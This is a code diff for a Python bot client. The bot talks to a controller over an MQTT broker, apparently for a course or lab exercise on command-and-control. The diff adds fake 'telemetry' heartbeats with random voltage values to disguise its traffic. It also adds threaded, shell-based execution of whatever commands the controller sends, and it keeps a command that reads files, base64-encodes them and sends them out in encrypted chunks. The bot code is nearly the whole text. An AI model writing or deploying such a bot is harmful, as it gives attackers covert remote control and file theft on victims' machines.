@@ -15,15 +15,32 @@ import paho.mqtt.client as mqtt
 from consts import *
 import random
 
-from utils import encrypt_payload_AES_then_b64, decrypt_payload
+from utils import encrypt_payload_AES_then_b64, decrypt_payload, log
 
-
+DEBUG_PRINT = False
 # broker = central server that receives all messages
 #          and then routes them to the correct destinations.
 
-def heartbeat(client):
-    # todo
-    pass;
+def run_heartbeat(client):
+    while True:
+        # random delay (45-90s)
+        time.sleep(random.uniform(45, 90))
+        heartbeat_text = f"HEARTBEAT: {BOT_ID} status OK"
+
+        # Send as 1/1 chunk
+        formatted_heartbeat = f"CHK:001:001:{heartbeat_text}"
+        encrypted_heartbeat = encrypt_payload_AES_then_b64(formatted_heartbeat)
+
+        packet = {
+            "s_id": BOT_ID,
+            "type": "telemetry_status",
+            "v_line": round(random.uniform(229.0, 231.5), 1),
+            DATA_KEY: encrypted_heartbeat
+        }
+        if(DEBUG_PRINT):
+            log("[*] fake heartbeat message sent...")
+        with mqtt_lock:
+            client.publish(TOPIC, json.dumps(packet))
 
 
 def send_fragmented_response(client, raw_result):
@@ -50,10 +67,14 @@ def send_fragmented_response(client, raw_result):
             "type": "telemetry_update", # Masquerade type
             DATA_KEY: encrypted_chunk
         }
-        client.publish(TOPIC, json.dumps(packet))
+        with mqtt_lock:
+            client.publish(TOPIC, json.dumps(packet))
+        log(f"    Sent chunk {i+1}/{total} ({len(chunk_data)} bytes)")
 
         # random delay
-        time.sleep(random.uniform(0.1, 0.4))
+        # todo NOTE, for a realistic bot, this should be a lot longer - similar to the heartbeat probably,
+        #  but for building and grading, nobody wants to wait longer
+        time.sleep(random.uniform(3, 5))
 
 
 def on_message(client, userdata, msg):
@@ -71,17 +92,17 @@ def on_message(client, userdata, msg):
             # introduce random delay
             time.sleep(random.uniform(0.35, 1.69))
 
-            print(f"[DEBUG]: Received command: {action} {argument}, executing...")
-            result = get_action_result(action, argument)
-            
-            print(f"[*] Dispatching response ({len(result)} bytes) in chunks...")
-            send_fragmented_response(client, result)
+            t = threading.Thread(target=process_and_respond, args=(client, action, argument))
+            t.start()
 
     except:
         # ignore other messages
         pass
 
-
+def process_and_respond(client, action, argument):
+    result = get_action_result(action, argument)
+    log(f"[*] Dispatching response ({len(result)} bytes) in chunks...")
+    send_fragmented_response(client, result)
 
 
 
@@ -95,33 +116,46 @@ def create_bot_packet(encrypted_res_b64):
 
 
 def get_action_result(action, argument):
-    if action == CMD_ANNOUNCE_BOT:
-        result = f"Bot {BOT_ID} is online."
-    elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
-        with open(argument, "rb") as f:
-            encoded_str = base64.b64encode(f.read()).decode('utf-8')
-            result = f"FILE_B64:{argument}:{encoded_str}"
-    else:
-        # execute other commands directly
-        # ignore blank "" args
-        cmd_list = [action] + ([argument] if argument else [])
-        result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
-    if result == "":
-        result = f"Command {action} executed successfully."
-    return result
+    try:
+        if action == CMD_ANNOUNCE_BOT:
+            result = f"Bot {BOT_ID} is online."
+        elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
+            with open(argument, "rb") as f:
+                encoded_str = base64.b64encode(f.read()).decode('utf-8')
+                result = f"FILE_B64:{argument}:{encoded_str}"
+        else:
+            # execute other commands directly
+            # ignore blank "" args
+            try:
+                full_cmd = f"{action} {argument}".strip()
+                result = subprocess.check_output(full_cmd, shell=True, stderr=subprocess.STDOUT).decode()
+                # Return result if exists, otherwise return the success string
+                return result if result.strip() else f"Execution of '{full_cmd}' successful (no output)."
+            except subprocess.CalledProcessError as e:
+                # Return the actual error from the shell
+                return f"Command Error (Exit Code {e.returncode}): {e.output.decode().strip()}"
 
 
-# both the bot and the controller are 'clients'
-# client = mqtt.Client()
-# added version to avoid warning
-client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+        if result == "":
+            result = f"Command {action} executed successfully."
+        return result
 
-# callback when a message is received
-client.on_message = on_message
-client.connect(BROKER, PORT)
-client.subscribe(TOPIC)
+    except Exception as e:
+        return f"System Error executing {action}: {str(e)}"
 
-print("Subscribed! Waiting for commands...")
+if __name__ == '__main__':
+    # both the bot and the controller are 'clients'
+    # added version to avoid warning
+    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+    mqtt_lock = threading.Lock()
 
-# prevents the script from ending.
-client.loop_forever()
+    threading.Thread(target=run_heartbeat, args=(client,), daemon=True).start()
+    # callback when a message is received
+    client.on_message = on_message
+    client.connect(BROKER, PORT)
+    client.subscribe(TOPIC)
+
+    log("Subscribed! Waiting for commands...")
+
+    # prevents the script from ending.
+    client.loop_forever()
